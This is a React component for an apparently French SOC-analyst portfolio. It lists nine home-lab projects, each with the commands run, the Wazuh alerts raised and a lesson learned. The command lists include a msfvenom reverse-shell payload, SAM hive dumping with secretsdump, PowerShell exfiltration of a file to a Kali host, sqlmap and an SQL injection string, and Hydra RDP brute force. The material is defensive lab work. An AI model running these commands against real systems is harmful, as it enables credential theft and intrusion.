import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { REPORTS } from './reports'

const SEV = {
  critical: { label: 'CRITICAL', bar: 'bg-critical', text: 'text-critical', border: 'border-l-critical' },
  high:     { label: 'HIGH',     bar: 'bg-high',     text: 'text-high',     border: 'border-l-high' },
  medium:   { label: 'MEDIUM',   bar: 'bg-medium',   text: 'text-medium',   border: 'border-l-medium' },
}

const ICONS = {
  1: 'bi-shield-slash-fill',
  2: 'bi-key-fill',
  3: 'bi-cloud-arrow-up-fill',
  4: 'bi-envelope-exclamation-fill',
  5: 'bi-diagram-3-fill',
  6: 'bi-shield-check',
  7: 'bi-database-fill-lock',
  8: 'bi-shield-lock-fill',
  9: 'bi-person-badge-fill',
}

const PROJECTS = [
  {
    id: 1,
    title: 'Évasion Antivirus & Détection Wazuh',
    sev: 'high',
    report: '/rapports/evasion-antivirus.pdf',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1562 — Impair Defenses',
    technique: 'msfvenom + encodage shikata_ga_nai',
    date: '2026-06-10',
    summary: "Payload msfvenom brut encodé 5 fois, livré via HTTP sur Windows Server 2022. Defender bloque à l'écriture. Wazuh déclenche deux règles — la chaîne de détection est complète même sans session établie.",
    steps: [
      'msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest ... (WinServer2022) — Defender bloque',
    ],
    detection: [
      'Rule 62123 niv.12  —  Windows Defender: Malware detected',
      'Rule 62124 niv.3   —  Windows Defender: Threat blocked',
    ],
    lesson: "Un payload brut msfvenom est détecté instantanément par les AV modernes. Sans obfuscation avancée, zéro chance de passer.",
  },
  {
    id: 2,
    title: 'Credential Dumping — SAM / NTLM',
    sev: 'critical',
    report: '/rapports/credential-dumping.pdf',
    rules: ['92026 (niv.14)'],
    mitre: 'T1003.002 — OS Credential Dumping',
    technique: 'reg.exe + Impacket secretsdump',
    date: '2026-06-14',
    summary: "Export des ruches SAM et SYSTEM via reg.exe, exfiltration SMB vers Kali, extraction des hachages NTLM avec secretsdump. Alerte Wazuh niveau 14 — critique maximum.",
    steps: [
      'reg save HKLM\\SAM C:\\Temp\\sam.hive',
      'reg save HKLM\\SYSTEM C:\\Temp\\system.hive',
      'copy .\\sam.hive \\\\kali\\share  (exfil SMB)',
      'secretsdump.py LOCAL -sam sam.hive -system system.hive  (Kali)',
    ],
    detection: [
      'Rule 92026 niv.14  —  reg.exe: SAM hive dump detected  [CRITICAL]',
    ],
    lesson: "reg.exe ciblant SAM est un IoC critique immédiat. Niveau 14 = alerte maximale, déclencherait une réponse aux incidents en production.",
  },
  {
    id: 3,
    title: 'Exfiltration HTTP non chiffrée',
    sev: 'critical',
    report: '/rapports/exfiltration-http.pdf',
    rules: ['100010 (niv.12)', '100011 (niv.14)'],
    mitre: 'T1048.003 — Exfiltration Over Unencrypted Protocol',
    technique: 'PowerShell Invoke-WebRequest vers HTTP python3',
    date: '2026-06-15',
    summary: "Données sensibles transmises depuis Windows Server via PowerShell vers un serveur HTTP sur Kali. Deux règles corrélées reconstituent la chaîne complète.",
    steps: [
      'python3 -m http.server 8888  (Kali)',
      'Invoke-WebRequest -Uri http://[KALI]:8888 -InFile secret.txt  (WinServer2022)',
    ],
    detection: [
      'Rule 100010 niv.12  —  PowerShell: outbound network connection',
      'Rule 100011 niv.14  —  Network: exfiltration port 8888 non-standard',
    ],
    lesson: "Corréler deux alertes distinctes pour reconstruire le scénario d'attaque — c'est exactement le cœur du métier d'analyste SOC.",
  },
  {
    id: 4,
    title: 'Phishing msfvenom — Chaîne complète',
    sev: 'high',
    report: '/rapports/phishing-msfvenom.pdf',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1566 — Phishing',
    technique: 'Payload .exe déguisé en facture, livraison HTTP',
    date: '2026-06-18',
    summary: "Simulation phishing bout-en-bout : facture_2026.exe créé, hébergé sur Kali, téléchargé et lancé sur la cible. Defender identifie Trojan:Win32/Zusy.NCD!MTB et bloque.",
    steps: [
      'msfvenom ... -o facture_2026.exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest + Start-Process facture_2026.exe  (WinServer2022)',
    ],
    detection: [
      'Rule 62123 niv.12  —  Defender: Trojan:Win32/Zusy.NCD!MTB detected',
      'Rule 62124 niv.3   —  Defender: Threat blocked',
    ],
    lesson: "Un payload msfvenom brut déguisé en document est reconnu instantanément. Les attaquants réels combinent packing, obfuscation et living-off-the-land.",
  },
  {
    id: 5,
    title: 'Network Discovery — Détection scan Nmap',
    sev: 'medium',
    rules: ['100012 (niv.10)', '100013 (niv.10)'],
    mitre: 'T1046 — Network Service Discovery',
    technique: 'Capture tshark + analyse signature SYN Nmap',
    date: '2026-07-06',
    summary: "Capture réseau avec tshark pendant un scan Nmap SYN stealth. 2117 paquets TCP SYN capturés. La signature est identifiable en quelques secondes dans le pcap.",
    steps: [
      'tshark -i eth1 -w capture.pcap  (Kali)',
      'nmap -sS -p 1-65535 [SERVEUR]  (Kali)',
      'Analyse : SYN sans SYN-ACK → 2117 paquets → pattern scan',
    ],
    detection: [
      'Rule 100012 niv.10  —  Network: Nmap SYN scan detected',
      'Rule 100013 niv.10  —  Network: Port sweep detected',
    ],
    lesson: "Reconnaître un scan Nmap dans une capture réseau (SYN sans SYN-ACK, masse de ports, courte durée) est une compétence fondamentale SOC.",
  },
  {
    id: 6,
    title: 'Audit de sécurité web — OWASP ZAP',
    sev: 'medium',
    rules: [],
    report: '/Rapport-Audit-OWASP-ZAP.pdf',
    mitre: 'OWASP — Secure Headers',
    technique: 'Scan passif ZAP + correctifs vercel.json',
    date: '2026-07-20',
    summary: "Audit passif d'une application web avec OWASP ZAP, mené de bout en bout : 16 faiblesses détectées (surtout des en-têtes de sécurité HTTP manquants), 6 en-têtes ajoutés via vercel.json et vérifiés sur le serveur, re-scan à 9 alertes dont 0 exploitable.",
    steps: [
      'sudo apt install -y zaproxy  (Kali)',
      'ZAP Manual Explore → scan passif sur le périmètre défini',
      'Édition vercel.json : CSP, HSTS, X-Frame-Options, nosniff, Referrer/Permissions-Policy',
      'git push → redéploiement → re-scan de vérification',
    ],
    detection: [
      'Scan initial : 16 alertes (0 grave) — en-têtes de sécurité manquants',
      '6 en-têtes de sécurité déployés via vercel.json, vérifiés sur le serveur',
      'Re-scan : 9 alertes, 0 exploitable — corrigé & vérifié',
    ],
    lesson: "Définir le périmètre AVANT de scanner, et savoir trier une vraie faille d'un bruit d'outil (compromis assumé, faux positif, ressource tierce). Le cycle détecter → corriger → re-tester est le cœur de la sécurisation.",
  },
  {
    id: 7,
    title: 'Injection SQL — Attaque, Détection & Correction',
    sev: 'critical',
    report: '/rapports/injection-sql.pdf',
    rules: ['31171 (niv.6)', '31106 (niv.6)'],
    mitre: 'T1190 — Exploit Public-Facing Application',
    technique: 'SQLMap (GET) + requête préparée PDO',
    date: '2026-07-22',
    summary: "Chaîne complète sur une application PHP vulnérable : extraction de toute la base avec SQLMap, détection de bout en bout dans Wazuh via l'access.log Apache (81 alertes), puis correction par requête préparée prouvée par un rejeu de l'attaque.",
    steps: [
      'sqlmap -u ".../login.php?email=test&mdp=test" -p email --batch --dump -D tuto -T users  (Kali)',
      "Injection manuelle : ' OR '1'='1' --  → connexion sans mot de passe",
      'Correction : requête préparée PDO ($bdd->prepare(...)->execute([...]))',
      'Rejeu SQLMap sur la version protégée → paramètre non injectable, aucun dump',
    ],
    detection: [
      'Rule 31171 niv.6  —  SQL injection attempt',
      'Rule 31106 niv.6  —  A web attack returned code 200 (success)  [T1190]',
    ],
    lesson: "Une seule ligne concaténée expose toute une base ; l'attaque automatisée est bruyante (81 alertes) donc détectable ; et il faut comprendre le chaînage des règles Wazuh (la règle finale est journalisée, pas celle attendue). La requête préparée ferme la faille.",
  },
  {
    id: 8,
    title: 'Force brute RDP — Détection Wazuh',
    sev: 'high',
    report: '/rapports/bruteforce-rdp.pdf',
    rules: ['100014 (niv.12)'],
    mitre: 'T1110 — Brute Force',
    technique: 'Hydra RDP + règle Wazuh 100014',
    date: '2026-07-24',
    summary: "Force brute RDP depuis Kali (compte leurre) contre un contrôleur de domaine. La règle personnelle 100014 (5 échecs 4625 en 30 s sur le même compte) se déclenche, l'alerte est investiguée dans le SIEM et un verdict d'analyste est rendu. En prime : débogage d'un agent « connecté » mais muet.",
    steps: [
      'Activer RDP sur la cible (fDenyTSConnections=0 + règle pare-feu)',
      "printf '...' > /tmp/pw.txt  (liste de mots de passe, Kali)",
      'hydra -l hacktest -P /tmp/pw.txt rdp://[SERVEUR] -t 4 -V  (Kali)',
      'Dashboard : Threat Hunting → rule.id:100014 → déplier l\'alerte',
      "Investigation : rechercher un Event 4624 (succès) depuis [KALI]",
    ],
    detection: [
      'Rule 100014 niv.12  —  Brute force : 5 échecs en 30 s sur le même compte  [T1110]',
      'Chaîne : Event 4625 → règle 60122 (Logon Failure) → 100014',
      'Verdict : 43 échecs, 0 succès (4624) → tentative échouée, pas de compromission',
    ],
    lesson: "Un agent SIEM « Active » (vert) peut silencieusement ne plus rien envoyer — angle mort de détection à surveiller. Et dans le dashboard : un filtre resté actif peut cacher une alerte, un niveau élevé (faux positif 92213) n'est pas une vraie menace. Trier le vrai du faux et vérifier la santé des agents = le cœur du métier.",
  },
  {
    id: 9,
    title: 'Active Directory — Déploiement & analyse des journaux',
    sev: 'medium',
    rules: [],
    report: '/rapports/active-directory.pdf',
    mitre: 'T1136 — Create Account · T1098 — Account Manipulation',
    technique: 'Windows Server 2022 + analyse Event Viewer',
    date: '2026-09-15',
    summary: "Déploiement d'un domaine Active Directory de zéro : contrôleur de domaine, DNS intégré, rattachement d'un poste Windows 11, annuaire structuré par service et comptes provisionnés. Puis la partie analyste : retrouver chaque action dans le journal de sécurité — 7 600 lignes filtrées à 25 — et l'interpréter. Quatre pannes réelles diagnostiquées en chemin.",
    steps: [
      'Adresse IP fixe + DNS sur 127.0.0.1, renommage AVANT la promotion (SRV-DC01)',
      'Installation du rôle AD DS, puis promotion — forêt soc.lab (deux étapes distinctes)',
      'DNS du poste vers le serveur → ping + nslookup soc.lab → rattachement au domaine',
      'Unités d\'organisation par service, trois comptes, droit attribué par groupe',
      'Observateur d\'événements : filtre 4720,4724,4732 → corrélation → export .evtx',
    ],
    detection: [
      '4720 + 4724  —  compte créé, puis mot de passe posé  (séquence, pas ligne isolée)',
      '4741 / compte en $  —  une machine a rejoint le domaine',
      '4732  —  droit accordé par groupe : journal du domaine OU journal local selon le groupe',
      'Verdict : 4 séquences pour 3 comptes créés → la 4e était le compte d\'ordinateur du poste',
    ],
    lesson: "Une ligne de journal seule ne raconte presque rien : c'est la séquence qui donne le sens. Un 4724 sans 4720 juste avant n'est pas une création de compte mais un mot de passe changé sur un compte existant — l'un des signaux les plus surveillés. Et savoir SUR QUELLE MACHINE chercher un événement vaut autant que connaître son numéro : chercher au mauvais endroit fait conclure à tort qu'il ne s'est rien passé.",
  },
]

function Tile({ p, idx, open, onToggle, onOpenReport }) {
  const s = SEV[p.sev]

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.45, delay: idx * 0.06 }}
      className="group bg-surface rounded-2xl overflow-hidden
        shadow-[0_13px_8px_-10px_rgba(0,0,0,0.3)]"
    >
      <div
        role="button"
        tabIndex={0}
        onClick={onToggle}
        onKeyDown={e => {
          if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault()
            onToggle()
          }
        }}
        className="w-full text-left cursor-pointer"
        aria-expanded={open}
      >
        <div
          className="h-40 flex items-center justify-center transition-transform duration-500 group-hover:scale-105"
          style={{ background: 'linear-gradient(135deg, #3a0a0a 0%, #ff2b2b 140%)' }}
        >
          <i className={`bi ${ICONS[p.id]} text-6xl text-white/90`} />
        </div>
        <div className="p-5">
          <div className="flex items-center gap-2 mb-2">
            <span className={`text-xs font-semibold uppercase tracking-wider ${s.text}`}>
              {s.label}
            </span>
            <span className="text-zinc-600">/</span>
            <span className="text-xs text-zinc-400">{p.date}</span>
          </div>
          <div className="flex items-start justify-between gap-2">
            <h3 className="font-display font-bold text-lg text-zinc-100 leading-tight flex-1">
              {p.title}
            </h3>
            {p.report && (
              <button
                type="button"
                onClick={e => { e.stopPropagation(); onOpenReport(p) }}
                className="inline-flex items-center gap-1 border border-accent text-accent text-xs font-medium px-2.5 py-1 rounded-md hover:bg-accent hover:text-white transition-colors duration-150 flex-shrink-0 whitespace-nowrap"
              >
                <i className="bi bi-file-earmark-text" /> Rapport
              </button>
            )}
          </div>
        </div>
      </div>

      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            key="detail"
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.25, ease: 'easeInOut' }}
            className="overflow-hidden"
          >
            <div className="px-5 pb-6 pt-2 border-t border-divider space-y-5">
              <p className="text-xs text-zinc-400 uppercase tracking-wide pt-4">
                {p.mitre} &nbsp;·&nbsp; {p.technique}
              </p>
              <p className="text-zinc-300 text-sm leading-relaxed">{p.summary}</p>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-500 mb-2.5">
                  Commandes exécutées
                </p>
                <div className="bg-bg border border-divider p-4 space-y-2">
                  {p.steps.map((step, i) => (
                    <p key={i} className="font-mono text-xs text-zinc-300 leading-relaxed">
                      <span className="text-zinc-600 select-none mr-2">{i + 1}.</span>
                      {step}
                    </p>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-500 mb-2.5">
                  Alertes déclenchées
                </p>
                <div className="space-y-2">
                  {p.detection.map((d, i) => (
                    <div key={i} className="flex items-start gap-2.5">
                      <span className="text-accent text-sm mt-px">✓</span>
                      <span className="font-mono text-xs text-zinc-200 leading-relaxed">{d}</span>
                    </div>
                  ))}
                  {p.rules.map(r => (
                    <p key={r} className="text-xs text-zinc-500">Rule {r}</p>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-500 mb-2.5">
                  Leçon SOC
                </p>
                <p className="text-sm text-zinc-300 leading-relaxed border-l-2 border-accent pl-4">
                  {p.lesson}
                </p>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

export default function Projets() {
  const [openId, setOpenId] = useState(null)
  const [reportProj, setReportProj] = useState(null)
  const ReportComp = reportProj ? REPORTS[reportProj.id] : null

  return (
    <section id="projets" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="mb-12 section-title-alert"
      >
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Mes Projets
        </h2>
        <div className="line-alert" />
        <p className="text-zinc-400 mt-4 max-w-xl mx-auto leading-relaxed">
          Neuf projets du lab : des attaques réelles détectées bout en bout par Wazuh,
          un audit de sécurité web (OWASP ZAP), une chaîne complète d'injection SQL,
          une détection de force brute RDP et le déploiement d'une infrastructure
          Active Directory analysée par ses journaux. Cliquer sur une carte pour les détails.
        </p>
      </motion.div>

      <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6 items-start">
        {PROJECTS.map((p, i) => (
          <Tile
            key={p.id}
            p={p}
            idx={i}
            open={openId === p.id}
            onToggle={() => setOpenId(id => (id === p.id ? null : p.id))}
            onOpenReport={setReportProj}
          />
        ))}
      </div>

      <AnimatePresence>
        {reportProj && ReportComp && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 sm:p-8"
            onClick={() => setReportProj(null)}
          >
            <motion.div
              initial={{ scale: 0.96, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.96, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="relative bg-surface rounded-xl overflow-hidden w-full max-w-4xl h-[90vh] flex flex-col shadow-2xl"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex items-center justify-between px-4 py-3 border-b border-divider flex-shrink-0">
                <span className="text-sm font-medium text-zinc-200 flex items-center gap-2 min-w-0">
                  <i className="bi bi-file-earmark-text text-accent flex-shrink-0" />
                  <span className="truncate">Rapport — {reportProj.title}</span>
                </span>
                <div className="flex items-center gap-4 flex-shrink-0">
                  {reportProj.report && (
                    <a
                      href={reportProj.report}
                      download
                      className="text-xs text-zinc-400 hover:text-accent transition-colors flex items-center gap-1"
                    >
                      <i className="bi bi-download" /> PDF
                    </a>
                  )}
                  <button
                    type="button"
                    onClick={() => setReportProj(null)}
                    aria-label="Fermer"
                    className="text-zinc-400 hover:text-white transition-colors text-xl leading-none"
                  >
                    ✕
                  </button>
                </div>
              </div>
              <div className="flex-1 overflow-y-auto px-5 sm:px-8 py-6">
                <ReportComp />
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </section>
  )
}
